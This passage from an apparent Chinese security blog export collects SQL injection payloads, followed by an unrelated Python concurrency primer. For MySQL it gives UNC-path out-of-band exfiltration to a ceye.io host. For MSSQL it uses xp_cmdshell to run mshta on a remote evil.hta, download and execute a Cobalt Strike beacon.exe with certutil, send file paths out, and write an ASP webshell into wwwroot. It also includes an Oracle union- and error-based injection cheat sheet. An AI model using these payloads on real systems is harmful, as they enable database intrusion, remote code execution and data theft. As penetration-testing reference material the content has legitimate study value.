<p>这也就解释了为什么concat()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
<p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据</p>
<p>由此Paylaod就为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h1 id="基于命令执行函数的无回显SQL注入"><a href="#基于命令执行函数的无回显SQL注入" class="headerlink" title="基于命令执行函数的无回显SQL注入"></a><center>基于命令执行函数的无回显SQL注入</center></h1><p>一个MsSql<code>高权限</code>注入点，可通过<code>xp_cmdshell</code>执行命令，但是没有回显信息。</p>
<p>因为没有回显，所以分2种方式利用。</p>
<h2 id="远程执行方式上线"><a href="#远程执行方式上线" class="headerlink" title="远程执行方式上线"></a>远程执行方式上线</h2><p>payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c ping ******.dnslog.cn&quot;</span></span><br><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c mshta http://192.168.1.105:8080/evil.hta&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="文件落地方式上线"><a href="#文件落地方式上线" class="headerlink" title="文件落地方式上线"></a>文件落地方式上线</h2><p>我们还可以使用以下这些文件落地方式来上线CS&#x2F;MSF，但前提是得提前准备好一个免杀的CS木马供远程下载和执行，否则也会被查杀和拦截。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Mshta/Certutil/Bitsadmin/Powershell/MpCmdRun</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c certutil -urlcache -split -f http://192.168.1.105:8080/beacon.exe C:\ProgramData\beacon.exe&quot;</span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c C:\ProgramData\beacon.exe&quot;</span><br></pre></td></tr></table></figure>

<p>同时此方式还可以实现外带绝对路径出来：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;cmd /c for /r C:\ProgramData\ %i in (beacon.exe*) do certutil -urlcache -split -f http://******.ceye.io/%i&#x27;</span></span><br></pre></td></tr></table></figure>

<p>以上除了用<code>xp_cmdshell</code>函数还可以用<code>sp_oacreate</code>替代。</p>
<h2 id="获取绝对路径Getshell"><a href="#获取绝对路径Getshell" class="headerlink" title="获取绝对路径Getshell"></a>获取绝对路径Getshell</h2><p>我们在实战中有时也会遇到无回显、不出网的场景，这时可以先去尝试通过404或文件报错页来获取网站的绝对路径，如果不行再去执行以下命令将找到的路径写入Web目录下，然后再去写入Webshell。</p>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;for /r C:\ %i in (1653042293000.png*) do echo %i&gt; %i\..\path.txt&#x27;</span></span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt;C:\inetpub\wwwroot\upload\shell.asp&#x27;</span></span><br></pre></td></tr></table></figure>

<p>或者可以通过执行以下命令在查找绝对路径的同时写入Webshell，在指定的C盘中循环查找某某文件，将找到的绝对路径保存在%i变量中，..&#x2F;是返回上级目录，如果有找到那个文件就往里边写入一个shell.asp。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>r C:\ <span class="operator">%</span>i <span class="keyword">in</span> (<span class="number">1653042293000.</span>png<span class="operator">*</span>) do echo <span class="operator">^</span><span class="operator">&lt;</span><span class="operator">%</span><span class="keyword">execute</span> request(&quot;1&quot;)<span class="operator">%</span><span class="operator">^</span><span class="operator">&gt;</span> <span class="operator">&gt;</span> <span class="operator">%</span>i<span class="operator">/</span>..<span class="operator">/</span>shell.asp</span><br></pre></td></tr></table></figure>

<h1 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a><center>笛卡尔积注入</center></h1><p>遇到不能使用括号，或者shell()函数不能使用的情况下。</p>
<p>具体数学实现就不说了，大概就是如下图：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_5ERbl7aIV2.png"></p>
<p>也就是说数字1先去乘以ABC，然后数字2再去乘以ABC，然后数字3再去乘以ABC，是不是感觉很熟悉，其实就是Burp suite里面的Intruder模块的Attack type里面的Clutser bomb攻击方式。</p>
<p>这样逐渐的去相乘，然后就会有个时间。所以又叫大负荷查询，大负荷注入。</p>
<p>Payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns</span><br></pre></td></tr></table></figure>



<ul>
<li><p>当where 1&#x3D;1时存在延时，where 1&#x3D;2时不延时，就说明存在时间盲注。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.tables a <span class="keyword">join</span> information_schema.columns b <span class="keyword">join</span> information_schema.columns c <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>列 ： 判断5kcrm_user表名下name列前两位是否为’ad’开头的内容，如果存在则延时</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">5</span>kcrm_action_log <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.columns b <span class="keyword">where</span> b.column_name regexp <span class="type">binary</span> <span class="string">&#x27;^ad&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>不延时，说明数据库中无adddxxx开头的列名。然后通过循环遍历所有字符，获取到数据库中所有列名，同样的方法可以获取表名</p>
<p>其他以此类推</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle注入</title>
    <url>/-SQLInject/Oracle/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打JAVA站一般数据库都是Oracle，有一些特点的原因，所以特别记录一下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownWynZ1puLEAxdOHl.png"></p>
<span id="more"></span>

<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;def&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;users_abcdef&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>username_gugofj,<span class="operator">+</span>password_wvqepc<span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users_lsnuvu<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<ul>
<li>数据库</li>
<li>表<br>  USERS_TPHDTZ</li>
<li>列<br>  PASSWORD_AGKTIJ<br>  USERNAME_UTZPGF</li>
<li>字段</li>
</ul>
<h1 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Mysql是中小型数据库，而Oracle是<strong>大型数据库</strong>。</p>
<p>在注入时Oracle数据库与MySQL数据库是有区别的。</p>
<h2 id="2、oracle数据库权限分为2类"><a href="#2、oracle数据库权限分为2类" class="headerlink" title="2、oracle数据库权限分为2类"></a>2、oracle数据库权限分为2类</h2><p>注释符：<code>--</code></p>
<p><strong>dba</strong>拥有全部权限，数据库<code>最高权限</code>，只有dba才可以创建数据库结构</p>
<p><strong>oracle数据库自带的dual表，只有一行一列，每个用户都可以使用</strong></p>
<p>dual表可能被删掉，sys可以恢复</p>
<h3 id="2-1-、dual表"><a href="#2-1-、dual表" class="headerlink" title="2.1 、dual表"></a>2.1 、dual表</h3><p>dual是一个<code>虚拟表</code>，用来构成select的语法规则，<strong>oracle保证dual里面永远只有一条记录</strong>。我们可以用它来做很多事情。</p>
<h2 id="3、判断是否为oracle数据库"><a href="#3、判断是否为oracle数据库" class="headerlink" title="3、判断是否为oracle数据库"></a>3、判断是否为oracle数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual)</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h2 id="4、dual表实现联合注入"><a href="#4、dual表实现联合注入" class="headerlink" title="4、dual表实现联合注入"></a>4、dual表实现联合注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n <span class="comment">--</span></span><br></pre></td></tr></table></figure>


<p><strong>强类型</strong>，字符类型需要对上，这里可以<strong>使用null代替无法猜测的数据类型</strong>位置如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-1、查库"><a href="#4-1、查库" class="headerlink" title="4.1、查库"></a>4.1、查库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">-- </span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个数据库&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第一个数据库&#x27;</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第二个数据库&#x27;</span>``),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="operator">-</span></span><br></pre></td></tr></table></figure>




<h3 id="4-2、查表"><a href="#4-2、查表" class="headerlink" title="4.2、查表"></a>4.2、查表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个表名&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-3、字段"><a href="#4-3、字段" class="headerlink" title="4.3、字段"></a>4.3、字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span>``<span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个字段&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>读取数据：字段名需要用<strong>双引号括起来！！</strong>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;字段名&quot;<span class="operator">||</span><span class="operator">-</span><span class="operator">||</span>&quot;字段名&quot;, <span class="keyword">from</span> 表名 <span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5、dual表实现报错注入"><a href="#5、dual表实现报错注入" class="headerlink" title="5、dual表实现报错注入"></a>5、dual表实现报错注入</h2><p>dbms_xdb_version.checkin()函数：获取当前用户名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_versionuncheckout()函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbms_xdb_versionuncheckout(<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p><code>utl_inaddr.get_host_name()函数</code> 8g,9g,10g,版本中不需要任何权限，11g及以后的版本需要网络访问权限</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> utl.inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_version.makeversioned()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_utility.sqlid_to_sqlhash()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_utility.sqlid_to_sqlhash(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">in</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ordsys.ord_dicom.getmappingxpath()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="keyword">user</span>,<span class="keyword">user</span>)<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ctxsys.drithsx.sn()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h2 id="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"><a href="#6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用" class="headerlink" title="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"></a>6、假如<code>Oracle数据库</code>中没有dual表也无法进行恢复的情况下用</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tab_columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;USERS_TPHDTZ&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+USERNAME_UTZPGF,+PASSWORD_AGKTIJ+FROM+USERS_TPHDTZ--</span></span><br></pre></td></tr></table></figure>






<p><code>&#39;</code>报错，<code>&#39;&#39;</code>显示正常</p>
<p>返回错误时，确认是Oracle数据库且</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM not-a-real-table)||&#x27;</span></span><br></pre></td></tr></table></figure>


<p>此数据库需要显式指定表明</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM dual)||&#x27;</span></span><br></pre></td></tr></table></figure>




<h2 id="7、其他payload总结"><a href="#7、其他payload总结" class="headerlink" title="7、其他payload总结"></a>7、其他payload总结</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,null..... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<p><strong>判断第n个字段的类型，依次类推即可</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,null...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,<span class="string">&#x27;null&#x27;</span>...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> owner, table_name <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’ <span class="keyword">and</span> owner <span class="operator">=</span> ‘foo’</span><br></pre></td></tr></table></figure>

<h1 id="JAVA中的注入"><a href="#JAVA中的注入" class="headerlink" title="JAVA中的注入"></a>JAVA中的注入</h1><p>伪代码方便白盒挖掘，当然黑盒也可以拿来判断一下。</p>
<table>
<thead>
<tr>
<th>种类</th>
<th>解释</th>
<th>伪代码</th>
</tr>
</thead>
<tbody><tr>
<td>String Source</td>
<td>输入点是字符串类型</td>
<td><code>one(@RequestParam(value = &quot;username&quot;) String username)</code></td>
</tr>
<tr>
<td>List<Long></td>
<td>输入点是Long泛型(用来测试误报)</td>
<td><code>longin(@RequestBody List&lt;Long&gt; user_list)</code></td>
</tr>
<tr>
<td>Optional<String></td>
<td>新特性</td>
<td><code>optionalLike(@RequestParam(value = &quot;username&quot;) Optional&lt;String&gt; optinal_username)</code></td>
</tr>
<tr>
<td>List<String> Source</td>
<td>输入点是String泛型</td>
<td><code>in(@RequestBody List&lt;String&gt; user_list)</code></td>
</tr>
<tr>
<td>Object Source</td>
<td>对象类型</td>
<td><code>objectParam(@RequestBody Student user)</code></td>
</tr>
<tr>
<td>MyBatis注入</td>
<td>XML分离SQL检测</td>
<td><code>myBatis(@RequestParam(value = &quot;name&quot;) String name)</code></td>
</tr>
<tr>
<td>In类型注入</td>
<td>In类型注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Like类型</td>
<td>Like类型注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Lombok</td>
<td>Lombok对注入漏洞的影响</td>
<td>参照代码</td>
</tr>
<tr>
<td>MyBatis注解方式注入</td>
<td>MyBatis注解方式注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Spring Data JPA</td>
<td>JPA 方式</td>
<td>参照代码</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>多进程、进程池、异步大总结</title>
    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>经常写脚本与工具，越发感觉到速度的重要性！本文从基础开始，基于Python讲解，适合小白阅读，但需要一定代码功底。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownrxesbPFqSN2uTp3.jpg"></p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>在正式进入学习之前，先要了解一定的基础知识。</p>
<h2 id="1-1-阻塞"><a href="#1-1-阻塞" class="headerlink" title="1.1 阻塞"></a>1.1 阻塞</h2><ul>
<li>程序未得到所需计算资源时被挂起的状态。</li>
<li><strong>程序在等待某个操作完成期间，自身无法继续干别的事情，则称该程序在该操作上是阻塞的****。</strong></li>
<li>常见的阻塞形式有：<code>网络I/O阻塞</code>、<code>磁盘I/O阻塞</code>、<code>用户输入阻塞</code><strong>等</strong>。</li>
</ul>
<p>阻塞是无处不在的，包括CPU切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。（如果是多核CPU则正在执行上下文切换操作的核不可被利用）</p>
<h2 id="1-2-非阻塞"><a href="#1-2-非阻塞" class="headerlink" title="1.2 非阻塞"></a>1.2 非阻塞</h2><ul>
<li><strong>程序在等待某操作过程中，自身不被阻塞，可以继续运行干别的事情，则称该程序在该操作上是非阻塞的。</strong></li>
<li>非阻塞并<code>不是</code>在任何程序级别、任何情况下都可以存在的。</li>
<li>仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li>
</ul>
<p>非阻塞的存在是因为阻塞存在，正因为某个操作阻塞导致的耗时与效率低下，我们才要把它变成非阻塞的。</p>
<h2 id="1-3-同步"><a href="#1-3-同步" class="headerlink" title="1.3 同步"></a>1.3 同步</h2><ul>
<li>不同程序单元为了完成某个任务，在执行过程中需靠某种通信方式以<strong>协调一致</strong>，称这些程序单元是同步执行的。</li>
<li>例如购物系统中更新商品库存，需要用“行锁”作为通信信号，让不同的更新请求强制排队顺序执行，那更新库存的操作是同步的。</li>
<li>简言之，<strong>同步意味着有序</strong>。</li>
</ul>
<h2 id="1-4-异步"><a href="#1-4-异步" class="headerlink" title="1.4 异步"></a>1.4 异步</h2><ul>
<li>为完成某个任务，不同程序单元之间<strong>过程中无需通信协调</strong>，也能完成任务的方式。</li>
<li>不相关的程序单元之间可以是异步的。</li>
<li>例如，爬虫下载网页。调度程序调用下载程序后，即可调度其他任务，而无需与该下载任务保持通信以协调行为。不同网页的下载、保存等操作都是无关的，也无需相互通知协调。这些异步操作的完成时刻并不确定。</li>
<li>简言之，<strong>异步意味着无序</strong>。</li>
</ul>
<p>上文提到的<code>“通信方式”</code>通常是指异步和并发编程提供的<code>同步原语</code>，如<code>信号量</code>、<code>锁</code>、<code>同步队列</code>等等。我们需知道，虽然这些通信方式是为了让多个程序在一定条件下同步执行，但正因为是异步的存在，才需要这些通信方式。如果所有程序都是按序执行，其本身就是同步的，又何需这些同步信号呢？</p>
<h2 id="1-5-并发"><a href="#1-5-并发" class="headerlink" title="1.5 并发"></a>1.5 并发</h2><ul>
<li>并发描述的是程序的组织结构。指程序要被设计成多个可独立执行的子任务。</li>
<li><strong>以利用有限的计算机资源使多个任务可以被实时或近实时执行为目的。</strong></li>
</ul>
<h2 id="1-6-并行"><a href="#1-6-并行" class="headerlink" title="1.6 并行"></a>1.6 并行</h2><ul>
<li>并行描述的是程序的执行状态。指多个任务同时被执行。</li>
<li><strong>以利用富余计算资源（多核CPU）加速完成多个任务为目的。</strong></li>
</ul>
